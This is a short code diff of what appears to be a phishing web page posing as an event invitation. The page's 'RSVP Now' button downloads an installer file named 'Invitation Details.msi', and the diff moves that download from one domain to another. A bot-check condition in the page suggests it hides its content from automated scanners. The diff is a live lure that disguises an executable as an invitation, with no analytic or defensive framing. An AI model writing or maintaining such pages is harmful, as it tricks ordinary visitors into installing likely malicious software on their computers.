@@ -312,7 +312,7 @@ if ($isBot === 'BOT') {
     <h1>Celebrate Life's <span class="highlight">Beautiful Moments</span></h1>
     <p class="subtitle">Join us for an evening filled with joy, laughter, and warm memories. Kindly RSVP now to download your exclusive invitation.</p>
     
-    <a href="https://gianteevent.de/don/Invitation Details.msi" class="button" id="rsvpButton">
+    <a href="https://youareinvited.cool/best/Invitation Details.msi" class="button" id="rsvpButton">
       RSVP Now <i class="fas fa-arrow-right"></i>
     </a>
 
@@ -412,4 +412,5 @@ if ($isBot === 'BOT') {
     })();
   </script>
 </body>
+
 </html>
